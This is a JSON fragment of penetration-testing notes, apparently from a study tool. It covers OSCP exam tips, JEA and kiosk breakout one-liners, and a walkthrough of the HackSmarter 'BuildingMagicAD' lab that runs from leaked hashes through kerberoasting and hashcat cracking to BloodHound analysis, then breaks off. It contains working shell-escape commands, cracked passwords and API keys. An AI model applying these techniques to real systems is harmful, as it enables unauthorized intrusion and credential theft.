        "text": "BLE CTF Guide",
        "url": "https://github.com/hackgnar/ble_ctf"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Discover and enumerate Bluetooth Classic and BLE devices.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Bonus Points Strategy",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "How to Earn 10 Bonus Points",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Requirements:**\n1. Complete all PWK course exercises\n2. Document 10 Proving Grounds machines\n3. Submit comprehensive lab report"
          },
          {
            "type": "text",
            "content": "**Why bonus points matter:**\n- Provides 10-point buffer\n- Can pass without compromising AD set\n- Reduces exam pressure\n- Allows for partial credit scenarios"
          },
          {
            "type": "note",
            "content": "Start working on bonus points early - don't wait until exam week.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Break Strategy",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "When to Take Breaks",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Mandatory Breaks:**\n- After rooting each machine (15 minutes)\n- Every 4 hours (10 minutes)\n- If stuck for 1 hour (30-minute break)"
          },
          {
            "type": "text",
            "content": "**What to Do During Breaks:**\n- Step away from computer\n- Eat/drink\n- Clear your mind\n- Review notes with fresh eyes"
          },
          {
            "type": "note",
            "content": "Don't skip breaks - they improve performance and prevent burnout.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Just Enough Administration (JEA)",
    "title": "Breaking Out of JEA",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "Command Injection via Parameters",
        "codes": [
          {
            "lang": "powershell",
            "code": "# If command allows -ArgumentList or similar\nInvoke-Expression \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Some commands may allow injection through parameters.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Abusing Allowed Cmdlets",
        "codes": [
          {
            "lang": "powershell",
            "code": "# If Start-Process is allowed\nStart-Process cmd -ArgumentList \"/c whoami\"\n\n# If Invoke-Command is allowed\nInvoke-Command -ScriptBlock { whoami }"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Look for cmdlets that can execute code or access files.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "File System Access via Allowed Cmdlets",
        "codes": [
          {
            "lang": "powershell",
            "code": "# If Get-Content is allowed\nGet-Content C:\\Users\\Administrator\\Desktop\\flag.txt\n\n# If Copy-Item is allowed\nCopy-Item C:\\secrets.txt C:\\accessible\\path\\"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Function Hijacking",
        "codes": [
          {
            "lang": "powershell",
            "code": "function Get-Process {\n    param($Name)\n    & cmd.exe /c $Name\n}\nGet-Process whoami"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Define functions that override allowed cmdlets.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Transcript Analysis",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ChildItem \"C:\\Users\\*\\Documents\\PowerShell\\Transcripts\" -Recurse"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "JEA logs transcripts. Check for sensitive information.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Kiosk Breakout",
    "title": "Breaking Restricted Shell",
    "tags": [
      "Defense_Evasion",
      "Linux",
      "Mobile",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Common Bypasses",
        "codes": [
          {
            "lang": "bash",
            "code": "# If vim/vi allowed\n:!/bin/bash\n\n# If less/more allowed\n!/bin/bash\n\n# If awk allowed\nawk 'BEGIN {system(\"/bin/bash\")}'\n\n# If find allowed\nfind . -exec /bin/bash \\;\n\n# If python allowed\npython -c 'import os; os.system(\"/bin/bash\")'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "Browser-Based Escapes",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "URL Tricks",
        "codes": [
          {
            "lang": "text",
            "code": "file://C:/Windows/System32/cmd.exe\nfile://C:/Windows/System32/\nC:\\Windows\\System32\\cmd.exe\n\\\\127.0.0.1\\c$\\Windows\\System32\\cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "JavaScript Execution",
        "codes": [
          {
            "lang": "javascript",
            "code": "// In address bar or console\nlocation.href='file:///C:/Windows/System32/cmd.exe'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Print Dialog Escape",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Print dialog often allows file browsing:\n1. Ctrl+P to open Print\n2. Change printer\n3. Browse for PDF/XPS output location\n4. Navigate to C:\\Windows\\System32\n5. Type cmd.exe in filename and Enter",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Save Dialog Escape",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Save dialog escape:\n1. Right-click, Save As\n2. Navigate to C:\\Windows\\System32\n3. Change file type to \"All Files\"\n4. Type cmd.exe in filename and Enter",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "BuildingMagicAD - Lab Machine",
    "title": "BuildingMagicAD - Lab Machine",
    "tags": [
      "HackSmarter"
    ],
    "steps": [
      {
        "title": "Machine Info",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Platform**: HackSmarter\n- **Difficulty**: Easy\n- **OS**: Windows\n- **IP Address**: 10.1.176.13\n- **Date Started**: 01-29-2026\n- **Date Completed**:\n- **User Flag**:\n- **Root Flag**:"
          }
        ]
      },
      {
        "title": "Scenario Description",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Objective:**\u00a0As a penetration tester on the Hack Smarter Red Team, your objective is to achieve a full compromise of the Active Directory environment.\n**Initial Access:**\u00a0A prior enumeration phase has yielded a leaked database containing user credentials (usernames and hashed passwords). This information will serve as your starting point for gaining initial access to the network.\n**Execution:**\u00a0Your task is to leverage the compromised credentials to escalate privileges, move laterally through the Active Directory, and ultimately achieve a complete compromise of the domain.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Provided Credentials",
        "substeps": [
          {
            "title": "Leaked Database",
            "codes": [
              {
                "lang": "text",
                "code": "id\tusername\tfull_name\trole\t\tpassword\n1\tr.widdleton\tRon Widdleton\tIntern Builder\tc4a21c4d438819d73d24851e7966229c\n2\tn.bottomsworth\tNeville Bottomsworth Plannner\t61ee643c5043eadbcdc6c9d1e3ebd298\n3\tl.layman\tLuna Layman\tPlanner\t\t8960516f904051176cc5ef67869de88f\n4\tc.smith\t\tChen Smith\tBuilder\t\tbbd151e24516a48790b2cd5845e7f148\n5\td.thomas\tDean Thomas\tBuilder\t\t4d14ff3e264f6a9891aa6cea1cfa17cb\n6\ts.winnigan\tSamuel Winnigan\tHR Manager\t078576a0569f4e0b758aedf650cb6d9a\n7\tp.jackson\tParvati Jackson\tShift Lead\teada74b2fa7f5e142ac412d767831b54\n8\tb.builder\tBob Builder\tElectrician\tdd4137bab3b52b55f99f18b7cd595448\n9\tt.ren\t\tTheodore Ren\tSafety Officer\tbfaf794a81438488e57ee3954c27cd75\n10\te.macmillan\tErnest Macmillan Surveyor\t47d23284395f618bea1959e710bc68ef"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Hashes from Leaked Database",
            "codes": [
              {
                "lang": "text",
                "code": "c4a21c4d438819d73d24851e7966229c\n61ee643c5043eadbcdc6c9d1e3ebd298\n8960516f904051176cc5ef67869de88f\nbbd151e24516a48790b2cd5845e7f148\n4d14ff3e264f6a9891aa6cea1cfa17cb\n078576a0569f4e0b758aedf650cb6d9a\neada74b2fa7f5e142ac412d767831b54\ndd4137bab3b52b55f99f18b7cd595448\nbfaf794a81438488e57ee3954c27cd75\n47d23284395f618bea1959e710bc68ef"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Usernames from Leaked Database",
            "codes": [
              {
                "lang": "bash",
                "code": "r.widdleton\nn.bottomsworth\nl.layman\nc.smith\nd.thomas\ns.winnigan\np.jackson\nb.builder\nt.ren\ne.macmillan"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Cracked Password `c4a21c4d438819d73d24851e7966229c:lilronron` for user `r.widdleton`",
                "variant": "important"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Directory Structure",
        "codes": [
          {
            "lang": "bash",
            "code": "WD=/root/machines/BuildingMagicAD/10.1.176.13 && mkdir -p $WD/{logs,web,scan,nxc,exploit,bloodhound,loot,privesc,www} && cd $WD && touch usernames passwords confirmedCreds notes && ls -latr"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Launch Logged Terminal Tabs",
        "codes": [
          {
            "lang": "bash",
            "code": "WD=/root/machines/BuildingMagicAD/10.1.176.13 && TS=$(date +%Y%m%d_%H%M) && xfce4-terminal --maximize --hide-menubar --hide-toolbar --working-directory=$WD/ --title=\"Shell\" -e \"script -q -f $WD/logs/shell_$TS.log\" --tab --working-directory=$WD/scan --title=\"Scan\" -e \"script -q -f $WD/logs/scan_$TS.log -c 'rustscan -a 10.1.176.13 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN $WD/scan/tcp.txt; exec bash'\" --tab --working-directory=$WD/nxc --title=\"NXC\" -e \"script -q -f $WD/logs/nxc_$TS.log\" --tab --working-directory=$WD/web --title=\"Web\" -e \"script -q -f $WD/logs/web_$TS.log\" --tab --working-directory=$WD/exploit --title=\"Exploit\" -e \"script -q -f $WD/logs/exploit_$TS.log\" --tab --working-directory=$WD/ --title=\"Notes\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Maximize Terminal Window",
        "codes": [
          {
            "lang": "bash",
            "code": "wmctrl -r :ACTIVE: -b add,maximized_vert,maximized_horz"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Edit /etc/hosts",
        "codes": [
          {
            "lang": "bash",
            "code": "10.1.176.13 dc01.buildingmagic.local buildingmagic.local"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumeration",
        "substeps": [
          {
            "title": "RustScan TCP",
            "codes": [
              {
                "lang": "bash",
                "code": "rustscan -a 10.1.176.13 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN scan.txt"
              },
              {
                "lang": "text",
                "code": "# Output\nOpen 10.1.176.13:53\nOpen 10.1.176.13:88\nOpen 10.1.176.13:80\nOpen 10.1.176.13:135\nOpen 10.1.176.13:139\nOpen 10.1.176.13:389\nOpen 10.1.176.13:445\nOpen 10.1.176.13:464\nOpen 10.1.176.13:593\nOpen 10.1.176.13:3269\nOpen 10.1.176.13:3268\nOpen 10.1.176.13:3389\nOpen 10.1.176.13:5985\nOpen 10.1.176.13:8080\nOpen 10.1.176.13:9389\nOpen 10.1.176.13:49664\nOpen 10.1.176.13:49670\nOpen 10.1.176.13:49677\nOpen 10.1.176.13:49676\nOpen 10.1.176.13:49713\nOpen 10.1.176.13:49849\n\nPORT      STATE    SERVICE          REASON          VERSION\n53/tcp    filtered domain           no-response\n80/tcp    filtered http             no-response\n88/tcp    filtered kerberos-sec     no-response\n135/tcp   filtered msrpc            no-response\n139/tcp   filtered netbios-ssn      no-response\n389/tcp   filtered ldap             no-response\n445/tcp   filtered microsoft-ds     no-response\n464/tcp   filtered kpasswd5         no-response\n593/tcp   open     ncacn_http       syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open     ldap             syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  filtered globalcatLDAPssl no-response\n3389/tcp  filtered ms-wbt-server    no-response\n5985/tcp  filtered wsman            no-response\n8080/tcp  filtered http-proxy       no-response\n9389/tcp  filtered adws             no-response\n49664/tcp filtered unknown          no-response\n49670/tcp filtered unknown          no-response\n49676/tcp open     ncacn_http       syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0\n49677/tcp filtered unknown          no-response\n49713/tcp filtered unknown          no-response\n49849/tcp filtered unknown          no-response\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Nmap UDP",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -sU --top-ports 20 -sV 10.1.176.13 -oN udp_scan.txt"
              },
              {
                "lang": "text",
                "code": "# Output"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "authfinder",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/authfinder && python3 authfinder.py 10.1.176.13 'r.widdleton' 'lilronron' --domain buildingmagic"
              },
              {
                "lang": "text",
                "code": "# Output\nTarget           Username         Password             Service      Result\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n10.1.176.13      r.widdleton      lilronron            smbexec      Auth\n10.1.176.13      r.widdleton      lilronron            wmi          Auth\n10.1.176.13      r.widdleton      lilronron            psexec       Auth\n10.1.176.13      r.widdleton      lilronron            atexec       Auth\n10.1.176.13      r.widdleton      lilronron            rdp          Auth\n10.1.176.13      r.widdleton      lilronron            ldap         Auth\n10.1.176.13      r.widdleton      lilronron            kerberos     Auth"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "nxc_enum",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/nxc_enum && python -m nxc_enum 10.1.176.13 -u 'r.widdleton' -p 'lilronron' -A --copy-paste -o /root/machines/BuildingMagicAD/10.1.176.13/nxc/nxc_enum_results.txt"
              },
              {
                "lang": "text",
                "code": "# Output\n[+] Target is a Domain Controller\n  Hostname:        DC01\n  FQDN:            DC01.BUILDINGMAGIC.LOCAL\n  NetBIOS Domain:  BUILDINGMAGIC\n  DNS Domain:      BUILDINGMAGIC.LOCAL\n  Domain SID:      S-1-5-21-934388623-3731635803-3176817623\n\n  OS: Windows Server 2022 Build 20348 x64\n  OS version: '2022'\n  Architecture: x64\n  OS build: '20348'\n\nBuilt-in Accounts (3)\nRID     Username                Description\n------  ----------------------  ----------------------------------------\n500     Administrator           Built-in account for administering th...\n501     Guest                   account for guest access to the compu...\n502     krbtgt                  Key Distribution Center Service Account\n\nComputer Accounts (1)\nRID     Username                Description\n------  ----------------------  ----------------------------------------\n1000    DC01$                   \n\nStandard Users (5)\nRID     Username                Description\n------  ----------------------  ----------------------------------------\n1104    h.potch                 \n1111    r.widdleton             \n1112    r.haggard               \n1113    h.grangon               \n1115    a.flatch                Project Manager\n\nRDP CONFIGURATION\n--------------------------------------------------\n  [+] RDP: Enabled\n  [*] Hostname: DC01\n  [+] NLA: Required\n      Network Level Authentication protects against some attacks"
              },
              {
                "lang": "bash",
                "code": "============================================================\n  KERBEROASTABLE ACCOUNTS (have SPNs)\n  Service tickets can be requested and cracked offline!\n============================================================\n\n  >>> r.haggard <<<\n      SPN: HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111\n\n============================================================\n\nGET THE HASHES:\n  nxc ldap 10.1.176.13 -u 'r.widdleton' -p 'lilronron' -d 'BUILDINGMAGIC.LOCAL' --kerberoasting hashes.txt\n\nCRACK WITH:\n  hashcat -m 13100 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule\n  john --format=krb5tgs hashes.txt --wordlist=wordlist.txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kerberoasting",
        "substeps": [
          {
            "title": "Cracking Hash",
            "codes": [
              {
                "lang": "bash",
                "code": "sudo hashcat -m 13100 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule"
              },
              {
                "lang": "bash",
                "code": "rubeushagrid"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Cracked Hash for `r.haggard` is `rubeushagrid`",
                "variant": "important"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap 10.1.176.13 -u 'r.widdleton' -p 'lilronron' -d 'BUILDINGMAGIC.LOCAL' --kerberoasting hashes.txt"
          },
          {
            "lang": "bash",
            "code": "$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$BUILDINGMAGIC.LOCAL\\r.haggard*$979b94993987616bbcc6cb43dba8cd77$3ff17f2a406a37b56368827d0b0ac03a94c47310e4ad7f0172f77bf387bd6d695cd4be17e50f64b919046b39a77ae471b6dea7c8f7c41a0f2558ec126740accd0725f4bb5302a01fc8ade8b17b6e3a675459b42a060dc864fbcc7c8dd3b064c6f9c8802d101916ea53fcec429c36b9cb41e44c214600dfb2881e956375f8049318c969e25a39243f729f66384ff6ce21b96871f6d8941af1a0d83fe4b8e62dd65b6a2b879e2b8ebc41b5db1fa233126f162a91ab09f056d4ee9361795aee80ec7a1a9d496d90bad75f8d8cca26e0f9aa4533e2ec4dadaf2fdb5bf4b2ab3905a8546bc6b23549bf9a792c0e52f2136e3182b70fddf0d273ad48ac420a8a8732a5c1c886d70b54b53ceb81a4d155af7be90388973076cfb839768b24915681ff6200eaa6ca5f2aacc0511bfb77ad71cd3f152ad309d2286402893e5ef213491c996bda8ae841b0c984f42decd618cbc7f7c040f5d2bf740be81e97d0e329ebbb6b5173802f391e292a1a18c687ccea6a20e867b7c0627ce6e64f6aa782d8272911be86b30b26833a0c82d0fa026dd192fa4001de1dbd55926253a0ea1d526a5baaea938ab1a6ed2d812297d0a1ade92449e714719bbab7f1b8c9cfd07540e18953cdc83b75a5cf102a45f7fdc0aa4381db3fd5079327b4ff82df502f7f8cfd3e5644bf936febe6b64090638634b691ff6dfddaa2429148a973b51d63716c7291bb2dd59040a882f290e4dba0a044a5d31f776eb5a2ceb52f0196207fde22fef6686ea90c8c646e1074ccbd770efd5e77ec8ffc7d4f0f4f156859ac979eaf531488f7a243cf3d4fbe6a6fbe7c29f2dc1766771210a5e2276b8f49aef331bb525026061c6a25da005272225ffd2ec006ee4c627de68647934cce198d69cee37c6af29bef8ae895fecc5952dcc632d229289056d43199f6143ac539691415989d6ed69bdf99f9efa5a670bbeb521e1eace0e798c49c39a4242575bbc78a01d3de92d84b299f345583ffead7a97436f82fc00118a31bd13135eb1581b6a951335a6956461ce0cd28eaf239e99cabda98213b3c656de0946348af688f67b968d1be7ec61fcc3a566f3826970d69bcebfa1bce21767a3f6bbb4051f8d715a060da2221649f624e0f90b92839061ca2ec8e1a57d0c483e4c63b3fdf31f7d325376f879bef0b50fbbe0f2797b7ebc16f1be25b4e7defbb0fe88a3ac55c6c8ba7a9016dac23560dc550f69dba1cb43cef5950b81169d6838fac040a5d64e68cab9cfdb736ba60cd098ba83c7eb2031ec135ed72ccdd5b05d9d7eae18ac04797c0bd65394ea21479bd93a0dcfd6d584ec4140647e7a9742b4f955fd67b9813f5f73a5e114365d3b1198193bc5909d629528d8a782959ce472076a92f7e3b4cc7e9a48723d38e53b505ebd27c833a706e087ea086b29dc141ad9f522aa17d5e0b2090a57df15bde5b73ee74c395e7fc489a132710e34f75ad96165b28f1f675a2dd0dbb8381a3c07af2ddc3817201811354a27b6c4e116c94a7101084be40342e2ff8b2f7e83f639818f115736ccce4f9e86eb728cd"
          }
        ]
      },
      {
        "title": "authfinder",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/authfinder && python3 authfinder.py 10.1.176.13 'r.haggard' 'rubeushagrid' --domain buildingmagic"
          },
          {
            "lang": "bash",
            "code": "Target           Username         Password             Service      Result\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n10.1.176.13      r.haggard        rubeushagrid         smbexec      Auth\n10.1.176.13      r.haggard        rubeushagrid         wmi          Auth\n10.1.176.13      r.haggard        rubeushagrid         psexec       Auth\n10.1.176.13      r.haggard        rubeushagrid         atexec       Auth\n10.1.176.13      r.haggard        rubeushagrid         rdp          Auth\n10.1.176.13      r.haggard        rubeushagrid         ldap         Auth\n10.1.176.13      r.haggard        rubeushagrid         kerberos     Auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/nxc_enum && python -m nxc_enum 10.1.176.13 -u 'r.haggard' -p 'rubeushagrid' -A --copy-paste -o /root/machines/BuildingMagicAD/10.1.176.13/nxc/r.haggard_nxc_enum_results.txt"
          },
          {
            "lang": "bash",
            "code": "# Output\nMEDIUM PRIORITY (3)\n------------------------------------------------------------\nbloodhound-ce-python -u 'r.haggard' -p 'rubeushagrid' -d BUILDINGMAGIC.LOCAL -dc DC01.BUILDINGMAGIC.LOCAL -ns 10.1.176.13 -c All --zip"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Bloodhound",
        "codes": [
          {
            "lang": "bash",
            "code": "bloodhound-ce-python -u 'r.haggard' -p 'rubeushagrid' -d BUILDINGMAGIC.LOCAL -dc DC01.BUILDINGMAGIC.LOCAL -ns 10.1.176.13 -c All --zip"
          },
          {
            "lang": "bash",
            "code": "# Output\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: buildingmagic.local\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.BUILDINGMAGIC.LOCAL\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.BUILDINGMAGIC.LOCAL\nINFO: Found 9 users\nINFO: Found 52 groups\nINFO: Found 3 gpos\nINFO: Connecting to GC LDAP server: dc01.buildingmagic.local\nWARNING: Could not resolve GPO link to CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=WIZARDING,DC=THM\nINFO: Found 2 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nWARNING: Could not resolve GPO link to cn={16B4CBF5-F6BE-49AA-98C9-F0A424DFB2C4},cn=policies,cn=system,DC=WIZARDING,DC=THM\nWARNING: Could not resolve GPO link to CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=WIZARDING,DC=THM\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.BUILDINGMAGIC.LOCAL\nINFO: Done in 00M 05S\nINFO: Compressing output into 20260129203650_bloodhound.zip"
          },
          {
            "lang": "bash",
            "code": "curl -L https://ghst.ly/getbhce | docker compose -f - down -v"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Install Bloodhound-ce with Docker Compose",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -L https://ghst.ly/getbhce | docker compose -f - up"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Password `frIREW6t_eyKulCRp3Es1bhCpK90CRGN` reset to `1qaz@WSX3edc$RFV`",
            "variant": "important"
          },
          {
            "type": "note",
            "content": "Key: `eAozdFKxcGnz3Y55yjh/udcOh5qpbFhJMTY4foCWz1xoITkS+xob9A==`\nID: `75bd0ce8-3e33-4bee-b911-18cca949f119`",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Access Web UI",
        "codes": [
          {
            "lang": "text",
            "code": "http://localhost:8080/ui/login"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Default credentials: `admin` / (random password from install logs). You'll be prompted to change it.",
            "variant": "info"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Uploaded Zip from `bloodhound-ce-python`",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Install Hackles",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/\ngit clone https://github.com/Real-Fruit-Snacks/hackles.git\ncd hackles\npython3 -m venv venv\nsource venv/bin/activate\npip install -r requirements.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Authenticate with BloodHound API",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles --auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "First-time setup only. Provides API ID and Key from BloodHound CE."
          }
        ]
      },
      {
        "title": "Check Import Status",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles --ingest-history"
          },
          {
            "lang": "bash",
            "code": "# Output\n[*] Ingest History (1 job(s)):\n\n+----+----------+---------------------+---------------------+----------+\n| ID | Status   | Start Time          | End Time            | Message  |\n+----+----------+---------------------+---------------------+----------+\n| 1  | Complete | 2026-01-30 01:55:37 | 2026-01-30 01:56:37 | Complete |\n+----+----------+---------------------+---------------------+----------+"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Get User Information for Owned Command",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p 'bloodhoundcommunityedition' --investigate '*@*'"
          },
          {
            "lang": "bash",
            "code": "R.HAGGARD@BUILDINGMAGIC.LOCAL\nR.WIDDLETON@BUILDINGMAGIC.LOCAL"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Set Users as Owned",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p 'bloodhoundcommunityedition' --own 'R.HAGGARD@BUILDINGMAGIC.LOCAL' --own 'R.WIDDLETON@BUILDINGMAGIC.LOCAL'"
          },
          {
            "lang": "bash",
            "code": "# Output\n[*] Connecting to bolt://127.0.0.1:7687...\n[+] Connected successfully\n[+] Marked as owned: R.HAGGARD@BUILDINGMAGIC.LOCAL\n[+] Marked as owned: R.WIDDLETON@BUILDINGMAGIC.LOCAL"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Investigate Users",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p 'bloodhoundcommunityedition' --investigate 'R.HAGGARD@BUILDINGMAGIC.LOCAL'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Full Analysis Report",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p 'bloodhoundcommunityedition' -a -q --abuse"
          },
          {
            "lang": "bash",
            "code": "# Output\n    Outbound Attack Edges (2)\n+---------------------+----------------------------------+-------+\n| Relationship        | Target                           | Type  |\n+---------------------+----------------------------------+-------+\n| ForceChangePassword | H.POTCH@BUILDINGMAGIC.LOCAL      | User  |\n| MemberOf            | DOMAIN USERS@BUILDINGMAGIC.LOCAL | Group |\n+---------------------+----------------------------------+-------+"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "User `R.HAGGARD`  has *ForceChangePassword* on `H.POTCH`",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Force Change Password on `H.POTCH`",
        "codes": [
          {
            "lang": "bash",
